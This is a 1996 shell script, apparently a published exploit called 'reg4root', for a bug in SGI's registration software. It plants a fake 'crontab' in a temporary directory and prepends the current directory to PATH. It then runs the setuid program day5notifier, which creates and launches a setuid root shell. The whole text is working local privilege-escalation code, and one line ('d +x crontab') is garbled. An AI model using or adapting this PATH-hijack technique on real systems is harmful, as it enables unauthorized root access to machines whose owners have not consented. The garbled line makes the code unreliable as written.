#!/bin/sh
# reg4root - Register me for Root!
#
# Exploit a bug in SGI's Registration Software
#
# -Mike Neuman
# mcn@EnGarde.com
# 8/6/96

MYPWD=`pwd`
mkdir /tmp/emptydir.$$
cd /tmp/emptydir.$$

cat <<EOF >crontab
cp /bin/sh ./suidshell
chmod 4755 suidshell
EOF
d +x crontab

PATH=.:$PATH
export PATH

/var/www/htdocs/WhatsNew/CustReg/day5notifier -procs 0

./suidshell

cd $MYPWD
rm -rf /tmp/emptydir.$$
